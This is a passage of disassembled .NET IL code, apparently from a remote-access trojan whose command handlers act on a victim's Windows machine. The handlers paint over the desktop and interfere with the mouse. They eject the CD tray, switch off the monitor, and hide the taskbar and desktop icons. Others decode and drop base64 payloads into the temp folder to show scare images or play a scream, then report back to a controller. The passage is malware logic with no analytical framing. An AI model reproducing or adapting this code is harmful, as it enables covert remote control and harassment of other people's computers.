      IL_129c:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_12a1:  stloc.s    V_79
      IL_12a3:  ldloc.s    V_70
      IL_12a5:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_12aa:  dup
      IL_12ab:  ldloc.s    V_75
      IL_12ad:  ldloc.s    V_78
      IL_12af:  ldloc.s    V_79
      IL_12b1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawIcon(class [System.Drawing]System.Drawing.Icon,
                                                                                           int32,
                                                                                           int32)
      IL_12b6:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_12bb:  ldloc.s    V_74
      IL_12bd:  ldc.i4.1
      IL_12be:  add.ovf
      IL_12bf:  stloc.s    V_74
      IL_12c1:  ldloc.s    V_74
      IL_12c3:  ldc.i4.s   10
      IL_12c5:  ble        IL_1216

      IL_12ca:  ldloc.s    V_69
      IL_12cc:  ldloc.s    V_70
      IL_12ce:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_12d3:  pop
      IL_12d4:  br         IL_1b66

      IL_12d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
      IL_12de:  call       native int j.OK::GetDesktopWindow()
      IL_12e3:  stloc.s    V_81
      IL_12e5:  ldloc.s    V_81
      IL_12e7:  call       native int j.OK::GetWindowDC(native int)
      IL_12ec:  stloc.s    V_82
      IL_12ee:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_12f3:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_12f8:  stloc.s    V_83
      IL_12fa:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Yellow()
      IL_12ff:  stloc.s    V_84
      IL_1301:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_1306:  stloc.s    V_85
      IL_1308:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Red()
      IL_130d:  stloc.s    V_86
      IL_130f:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Black()
      IL_1314:  stloc.s    V_87
      IL_1316:  ldloc.s    V_84
      IL_1318:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_131d:  stloc.s    V_88
      IL_131f:  ldc.i4.s   100
      IL_1321:  stloc.s    V_89
      IL_1323:  ldc.i4.s   100
      IL_1325:  stloc.s    V_90
      IL_1327:  call       float32 [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Rnd()
      IL_132c:  ldloca.s   V_83
      IL_132e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1333:  ldloc.s    V_89
      IL_1335:  sub.ovf
      IL_1336:  conv.r4
      IL_1337:  mul
      IL_1338:  conv.r8
      IL_1339:  call       float64 [mscorlib]System.Math::Floor(float64)
      IL_133e:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_1343:  conv.ovf.i4
      IL_1344:  stloc.s    V_91
      IL_1346:  call       float32 [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Rnd()
      IL_134b:  ldloca.s   V_83
      IL_134d:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1352:  ldloc.s    V_90
      IL_1354:  sub.ovf
      IL_1355:  conv.r4
      IL_1356:  mul
      IL_1357:  conv.r8
      IL_1358:  call       float64 [mscorlib]System.Math::Floor(float64)
      IL_135d:  call       float64 [mscorlib]System.Math::Round(float64)
      IL_1362:  conv.ovf.i4
      IL_1363:  stloc.s    V_92
      IL_1365:  ldloc.s    V_91
      IL_1367:  ldloc.s    V_92
      IL_1369:  ldloc.s    V_89
      IL_136b:  ldloc.s    V_90
      IL_136d:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_1372:  stloc.s    V_93
      IL_1374:  ldloc.s    V_82
      IL_1376:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_137b:  dup
      IL_137c:  ldloc.s    V_88
      IL_137e:  ldloc.s    V_93
      IL_1380:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_1385:  ldloc.s    V_85
      IL_1387:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_138c:  stloc.s    V_94
      IL_138e:  ldc.i4.s   20
      IL_1390:  stloc.s    V_95
      IL_1392:  ldc.i4.s   20
      IL_1394:  stloc.s    V_96
      IL_1396:  ldloc.s    V_91
      IL_1398:  ldc.i4.s   10
      IL_139a:  add.ovf
      IL_139b:  stloc.s    V_97
      IL_139d:  ldloc.s    V_92
      IL_139f:  ldc.i4.s   20
      IL_13a1:  add.ovf
      IL_13a2:  stloc.s    V_98
      IL_13a4:  ldloc.s    V_91
      IL_13a6:  ldloc.s    V_89
      IL_13a8:  add.ovf
      IL_13a9:  ldc.i4.s   30
      IL_13ab:  sub.ovf
      IL_13ac:  stloc.s    V_99
      IL_13ae:  ldloc.s    V_92
      IL_13b0:  ldc.i4.s   20
      IL_13b2:  add.ovf
      IL_13b3:  stloc.s    V_100
      IL_13b5:  ldloc.s    V_97
      IL_13b7:  ldloc.s    V_98
      IL_13b9:  ldloc.s    V_95
      IL_13bb:  ldloc.s    V_96
      IL_13bd:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_13c2:  stloc.s    V_101
      IL_13c4:  ldloc.s    V_99
      IL_13c6:  ldloc.s    V_100
      IL_13c8:  ldloc.s    V_95
      IL_13ca:  ldloc.s    V_96
      IL_13cc:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_13d1:  stloc.s    V_102
      IL_13d3:  dup
      IL_13d4:  ldloc.s    V_94
      IL_13d6:  ldloc.s    V_101
      IL_13d8:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_13dd:  dup
      IL_13de:  ldloc.s    V_94
      IL_13e0:  ldloc.s    V_102
      IL_13e2:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_13e7:  ldloc.s    V_86
      IL_13e9:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_13ee:  stloc.s    V_103
      IL_13f0:  ldc.i4.s   10
      IL_13f2:  stloc.s    V_104
      IL_13f4:  ldc.i4.s   10
      IL_13f6:  stloc.s    V_105
      IL_13f8:  ldloc.s    V_97
      IL_13fa:  ldc.i4.3
      IL_13fb:  add.ovf
      IL_13fc:  stloc.s    V_106
      IL_13fe:  ldloc.s    V_98
      IL_1400:  ldc.i4.5
      IL_1401:  add.ovf
      IL_1402:  stloc.s    V_107
      IL_1404:  ldloc.s    V_99
      IL_1406:  ldc.i4.3
      IL_1407:  add.ovf
      IL_1408:  stloc.s    V_108
      IL_140a:  ldloc.s    V_100
      IL_140c:  ldc.i4.5
      IL_140d:  add.ovf
      IL_140e:  stloc.s    V_109
      IL_1410:  ldloc.s    V_106
      IL_1412:  ldloc.s    V_107
      IL_1414:  ldloc.s    V_104
      IL_1416:  ldloc.s    V_105
      IL_1418:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_141d:  stloc.s    V_110
      IL_141f:  ldloc.s    V_108
      IL_1421:  ldloc.s    V_109
      IL_1423:  ldloc.s    V_104
      IL_1425:  ldloc.s    V_105
      IL_1427:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(int32,
                                                                                         int32,
                                                                                         int32,
                                                                                         int32)
      IL_142c:  stloc.s    V_111
      IL_142e:  dup
      IL_142f:  ldloc.s    V_103
      IL_1431:  ldloc.s    V_110
      IL_1433:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_1438:  dup
      IL_1439:  ldloc.s    V_103
      IL_143b:  ldloc.s    V_111
      IL_143d:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillEllipse(class [System.Drawing]System.Drawing.Brush,
                                                                                              valuetype [System.Drawing]System.Drawing.Rectangle)
      IL_1442:  ldloc.s    V_87
      IL_1444:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_1449:  stloc.s    V_112
      IL_144b:  ldc.i4.s   40
      IL_144d:  stloc.s    V_113
      IL_144f:  ldc.i4.s   20
      IL_1451:  stloc.s    V_114
      IL_1453:  ldloc.s    V_91
      IL_1455:  ldc.i4.s   30
      IL_1457:  add.ovf
      IL_1458:  stloc.s    V_115
      IL_145a:  ldloc.s    V_92
      IL_145c:  ldc.i4.s   60
      IL_145e:  add.ovf
      IL_145f:  stloc.s    V_116
      IL_1461:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.GraphicsPath::.ctor()
      IL_1466:  stloc.s    V_117
      IL_1468:  ldloc.s    V_117
      IL_146a:  ldloc.s    V_115
      IL_146c:  ldloc.s    V_116
      IL_146e:  ldloc.s    V_113
      IL_1470:  ldloc.s    V_114
      IL_1472:  ldc.r4     180.
      IL_1477:  ldc.r4     180.
      IL_147c:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.GraphicsPath::AddArc(int32,
                                                                                                       int32,
                                                                                                       int32,
                                                                                                       int32,
                                                                                                       float32,
                                                                                                       float32)
      IL_1481:  dup
      IL_1482:  ldloc.s    V_112
      IL_1484:  ldloc.s    V_117
      IL_1486:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillPath(class [System.Drawing]System.Drawing.Brush,
                                                                                           class [System.Drawing]System.Drawing.Drawing2D.GraphicsPath)
      IL_148b:  ldloc.s    V_88
      IL_148d:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1492:  ldloc.s    V_94
      IL_1494:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1499:  ldloc.s    V_103
      IL_149b:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14a0:  ldloc.s    V_112
      IL_14a2:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14a7:  dup
      IL_14a8:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_14ad:  ldloc.s    V_81
      IL_14af:  ldloc.s    V_82
      IL_14b1:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_14b6:  pop
      IL_14b7:  ldloc.s    V_88
      IL_14b9:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14be:  ldloc.s    V_94
      IL_14c0:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14c5:  ldloc.s    V_103
      IL_14c7:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14cc:  ldloc.s    V_112
      IL_14ce:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_14d3:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_14d8:  ldloc.s    V_81
      IL_14da:  ldloc.s    V_82
      IL_14dc:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_14e1:  pop
      IL_14e2:  br         IL_1b66

      IL_14e7:  call       native int j.OK::GetDesktopWindow()
      IL_14ec:  stloc.s    V_118
      IL_14ee:  ldloc.s    V_118
      IL_14f0:  call       native int j.OK::GetWindowDC(native int)
      IL_14f5:  stloc.s    V_119
      IL_14f7:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_14fc:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1501:  stloc.s    V_21
      IL_1503:  ldloca.s   V_21
      IL_1505:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_150a:  stloc.s    V_120
      IL_150c:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1511:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1516:  stloc.s    V_21
      IL_1518:  ldloca.s   V_21
      IL_151a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_151f:  stloc.s    V_121
      IL_1521:  ldc.i4.7
      IL_1522:  newarr     [System.Drawing]System.Drawing.Color
      IL_1527:  dup
      IL_1528:  ldc.i4.0
      IL_1529:  ldc.i4     0x80
      IL_152e:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Red()
      IL_1533:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1538:  stelem     [System.Drawing]System.Drawing.Color
      IL_153d:  dup
      IL_153e:  ldc.i4.1
      IL_153f:  ldc.i4     0x80
      IL_1544:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Orange()
      IL_1549:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_154e:  stelem     [System.Drawing]System.Drawing.Color
      IL_1553:  dup
      IL_1554:  ldc.i4.2
      IL_1555:  ldc.i4     0x80
      IL_155a:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Yellow()
      IL_155f:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1564:  stelem     [System.Drawing]System.Drawing.Color
      IL_1569:  dup
      IL_156a:  ldc.i4.3
      IL_156b:  ldc.i4     0x80
      IL_1570:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Green()
      IL_1575:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_157a:  stelem     [System.Drawing]System.Drawing.Color
      IL_157f:  dup
      IL_1580:  ldc.i4.4
      IL_1581:  ldc.i4     0x80
      IL_1586:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Blue()
      IL_158b:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_1590:  stelem     [System.Drawing]System.Drawing.Color
      IL_1595:  dup
      IL_1596:  ldc.i4.5
      IL_1597:  ldc.i4     0x80
      IL_159c:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Indigo()
      IL_15a1:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_15a6:  stelem     [System.Drawing]System.Drawing.Color
      IL_15ab:  dup
      IL_15ac:  ldc.i4.6
      IL_15ad:  ldc.i4     0x80
      IL_15b2:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Violet()
      IL_15b7:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::FromArgb(int32,
                                                                                                                         valuetype [System.Drawing]System.Drawing.Color)
      IL_15bc:  stelem     [System.Drawing]System.Drawing.Color
      IL_15c1:  stloc.s    V_122
      IL_15c3:  ldc.i4.0
      IL_15c4:  ldc.i4.0
      IL_15c5:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_15ca:  ldloc.s    V_120
      IL_15cc:  ldloc.s    V_121
      IL_15ce:  newobj     instance void [System.Drawing]System.Drawing.Point::.ctor(int32,
                                                                                     int32)
      IL_15d3:  ldloc.s    V_122
      IL_15d5:  ldc.i4.0
      IL_15d6:  ldelem     [System.Drawing]System.Drawing.Color
      IL_15db:  ldloc.s    V_122
      IL_15dd:  ldloc.s    V_122
      IL_15df:  ldlen
      IL_15e0:  conv.i4
      IL_15e1:  ldc.i4.1
      IL_15e2:  sub.ovf
      IL_15e3:  ldelem     [System.Drawing]System.Drawing.Color
      IL_15e8:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                                             valuetype [System.Drawing]System.Drawing.Point,
                                                                                                             valuetype [System.Drawing]System.Drawing.Color,
                                                                                                             valuetype [System.Drawing]System.Drawing.Color)
      IL_15ed:  stloc.s    V_123
      IL_15ef:  newobj     instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::.ctor()
      IL_15f4:  stloc.s    V_124
      IL_15f6:  ldloc.s    V_124
      IL_15f8:  ldloc.s    V_122
      IL_15fa:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::set_Colors(valuetype [System.Drawing]System.Drawing.Color[])
      IL_15ff:  ldloc.s    V_122
      IL_1601:  ldlen
      IL_1602:  conv.i4
      IL_1603:  ldc.i4.1
      IL_1604:  sub.ovf
      IL_1605:  ldc.i4.1
      IL_1606:  add.ovf
      IL_1607:  newarr     [mscorlib]System.Single
      IL_160c:  stloc.s    V_125
      IL_160e:  ldloc.s    V_122
      IL_1610:  ldlen
      IL_1611:  conv.i4
      IL_1612:  ldc.i4.1
      IL_1613:  sub.ovf
      IL_1614:  stloc.s    V_126
      IL_1616:  ldc.i4.0
      IL_1617:  stloc.s    V_127
      IL_1619:  br.s       IL_1631

      IL_161b:  ldloc.s    V_125
      IL_161d:  ldloc.s    V_127
      IL_161f:  ldloc.s    V_127
      IL_1621:  conv.r4
      IL_1622:  ldloc.s    V_122
      IL_1624:  ldlen
      IL_1625:  conv.i4
      IL_1626:  ldc.i4.1
      IL_1627:  sub.ovf
      IL_1628:  conv.r4
      IL_1629:  div
      IL_162a:  stelem.r4
      IL_162b:  ldloc.s    V_127
      IL_162d:  ldc.i4.1
      IL_162e:  add.ovf
      IL_162f:  stloc.s    V_127
      IL_1631:  ldloc.s    V_127
      IL_1633:  ldloc.s    V_126
      IL_1635:  ble.s      IL_161b

      IL_1637:  ldloc.s    V_124
      IL_1639:  ldloc.s    V_125
      IL_163b:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.ColorBlend::set_Positions(float32[])
      IL_1640:  ldloc.s    V_123
      IL_1642:  ldloc.s    V_124
      IL_1644:  callvirt   instance void [System.Drawing]System.Drawing.Drawing2D.LinearGradientBrush::set_InterpolationColors(class [System.Drawing]System.Drawing.Drawing2D.ColorBlend)
      IL_1649:  ldloc.s    V_119
      IL_164b:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHdc(native int)
      IL_1650:  dup
      IL_1651:  ldloc.s    V_123
      IL_1653:  ldc.i4.0
      IL_1654:  ldc.i4.0
      IL_1655:  ldloc.s    V_120
      IL_1657:  ldloc.s    V_121
      IL_1659:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::FillRectangle(class [System.Drawing]System.Drawing.Brush,
                                                                                                int32,
                                                                                                int32,
                                                                                                int32,
                                                                                                int32)
      IL_165e:  ldloc.s    V_123
      IL_1660:  callvirt   instance void [System.Drawing]System.Drawing.Brush::Dispose()
      IL_1665:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_166a:  ldloc.s    V_118
      IL_166c:  ldloc.s    V_119
      IL_166e:  call       bool j.OK::ReleaseDC(native int,
                                                native int)
      IL_1673:  pop
      IL_1674:  br         IL_1b66

      IL_1679:  ldnull
      IL_167a:  ldftn      void j.OK::Mouse()
      IL_1680:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_1685:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_168a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_168f:  br         IL_1b66

      IL_1694:  ldstr      "set CDAudio door open"
      IL_1699:  ldnull
      IL_169a:  ldc.i4.0
      IL_169b:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_16a0:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_16a5:  pop
      IL_16a6:  br         IL_1b66

      IL_16ab:  ldstr      "set CDAudio door closed"
      IL_16b0:  ldnull
      IL_16b1:  ldc.i4.0
      IL_16b2:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_16b7:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_16bc:  pop
      IL_16bd:  br         IL_1b66

      IL_16c2:  ldc.i4.m1
      IL_16c3:  ldc.i4     0x112
      IL_16c8:  ldc.i4     0xf170
      IL_16cd:  ldc.i4.m1
      IL_16ce:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_16d3:  br         IL_1b66

      IL_16d8:  ldc.i4.m1
      IL_16d9:  ldc.i4     0x112
      IL_16de:  ldc.i4     0xf170
      IL_16e3:  ldc.i4.2
      IL_16e4:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_16e9:  br         IL_1b66

      IL_16ee:  ldstr      "Shell_TrayWnd"
      IL_16f3:  ldnull
      IL_16f4:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_16f9:  ldc.i4.0
      IL_16fa:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_16ff:  pop
      IL_1700:  leave      IL_2724

      IL_1705:  ldstr      "Shell_TrayWnd"
      IL_170a:  ldnull
      IL_170b:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1710:  ldc.i4.4
      IL_1711:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1716:  pop
      IL_1717:  leave      IL_2724

      IL_171c:  ldstr      "Progman"
      IL_1721:  ldnull
      IL_1722:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1727:  ldc.i4.0
      IL_1728:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_172d:  pop
      IL_172e:  leave      IL_2724

      IL_1733:  ldstr      "Progman"
      IL_1738:  ldnull
      IL_1739:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_173e:  ldc.i4.4
      IL_173f:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1744:  pop
      IL_1745:  leave      IL_2724

      IL_174a:  ldstr      "ChamaFrmTerrorrr"
      IL_174f:  call       bool j.OK::Send(string)
      IL_1754:  pop
      IL_1755:  leave      IL_2724

      IL_175a:  ldstr      "off"
      IL_175f:  stsfld     string j.OK::SCREAM
      .try
      {
        IL_1764:  ldnull
        IL_1765:  stloc.s    V_128
        IL_1767:  ldloc.3
        IL_1768:  ldc.i4.2
        IL_1769:  ldelem.ref
        IL_176a:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_176f:  ldc.i4.0
        IL_1770:  stloc.s    V_130
        IL_1772:  ldloca.s   V_130
        IL_1774:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_1779:  stloc.s    V_128
        IL_177b:  ldstr      "temp"
        IL_1780:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_1785:  ldstr      "\\"
        IL_178a:  ldc.i4.s   10
        IL_178c:  call       string j.OK::RN(int32)
        IL_1791:  ldloc.3
        IL_1792:  ldc.i4.1
        IL_1793:  ldelem.ref
        IL_1794:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1799:  stloc.s    V_129
        IL_179b:  ldloc.s    V_129
        IL_179d:  ldloc.s    V_128
        IL_179f:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_17a4:  newobj     instance void frmSustos::.ctor()
        IL_17a9:  dup
        IL_17aa:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
        IL_17af:  ldloc.s    V_129
        IL_17b1:  call       class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::FromFile(string)
        IL_17b6:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_Image(class [System.Drawing]System.Drawing.Image)
        IL_17bb:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_17c0:  leave.s    IL_17d1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_17c2:  dup
        IL_17c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_17c8:  stloc.s    V_131
        IL_17ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_17cf:  leave.s    IL_17d1

      }  // end handler
      IL_17d1:  leave      IL_2724

      IL_17d6:  ldstr      "on"
      IL_17db:  stsfld     string j.OK::SCREAM
      .try
      {
        IL_17e0:  ldnull
        IL_17e1:  stloc.s    V_132
        IL_17e3:  ldloc.3
        IL_17e4:  ldc.i4.2
        IL_17e5:  ldelem.ref
        IL_17e6:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_17eb:  ldc.i4.0
        IL_17ec:  stloc.s    V_130
        IL_17ee:  ldloca.s   V_130
        IL_17f0:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_17f5:  stloc.s    V_132
        IL_17f7:  ldstr      "temp"
        IL_17fc:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_1801:  ldstr      "\\"
        IL_1806:  ldc.i4.s   10
        IL_1808:  call       string j.OK::RN(int32)
        IL_180d:  ldloc.3
        IL_180e:  ldc.i4.1
        IL_180f:  ldelem.ref
        IL_1810:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_1815:  stloc.s    V_133
        IL_1817:  ldloc.s    V_133
        IL_1819:  ldloc.s    V_132
        IL_181b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1820:  newobj     instance void frmSustos::.ctor()
        IL_1825:  dup
        IL_1826:  callvirt   instance class [System.Windows.Forms]System.Windows.Forms.PictureBox frmSustos::get_PictureBox1()
        IL_182b:  ldloc.s    V_133
        IL_182d:  call       class [System.Drawing]System.Drawing.Image [System.Drawing]System.Drawing.Image::FromFile(string)
        IL_1832:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.PictureBox::set_Image(class [System.Drawing]System.Drawing.Image)
        IL_1837:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Control::Show()
        IL_183c:  leave.s    IL_184d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_183e:  dup
        IL_183f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1844:  stloc.s    V_134
        IL_1846:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_184b:  leave.s    IL_184d

      }  // end handler
      IL_184d:  leave      IL_2724

      IL_1852:  nop
      .try
      {
        IL_1853:  ldnull
        IL_1854:  stloc.s    V_135
        IL_1856:  ldloc.3
        IL_1857:  ldc.i4.2
        IL_1858:  ldelem.ref
        IL_1859:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_185e:  ldc.i4.0
        IL_185f:  stloc.s    V_130
        IL_1861:  ldloca.s   V_130
        IL_1863:  call       uint8[] j.OK::ZIP(uint8[],
                                               bool&)
        IL_1868:  stloc.s    V_135
        IL_186a:  ldstr      "temp"
        IL_186f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
        IL_1874:  ldstr      "\\scream.wav"
        IL_1879:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_187e:  ldloc.s    V_135
        IL_1880:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_1885:  ldstr      "SoundUp"
        IL_188a:  call       bool j.OK::Send(string)
        IL_188f:  pop
        IL_1890:  leave.s    IL_18a1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1892:  dup
        IL_1893:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1898:  stloc.s    V_136
